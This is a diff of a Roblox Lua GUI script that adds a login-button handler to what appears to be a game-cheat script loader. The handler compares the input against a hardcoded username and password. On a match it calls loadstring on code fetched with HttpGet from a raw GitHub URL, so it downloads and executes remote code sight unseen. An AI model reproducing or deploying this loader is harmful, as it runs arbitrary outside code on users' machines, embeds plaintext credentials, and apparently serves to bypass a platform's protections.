@@ -144,5 +144,14 @@ local function EJXSX_fake_script() -- login.LocalScript
 			button.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
 		end 
 	end)
+	button.MouseButton1Click:Connect(function() 
+		if UserData.Text == "hexis" and UserPass.Text == "tplink123lol" then
+			script.Parent.Parent.Visible = false 
+			wait(0.3)
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/lodi'),true))()
+		else
+			button.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+		end 
+	end)
 end
 coroutine.wrap(EJXSX_fake_script)()
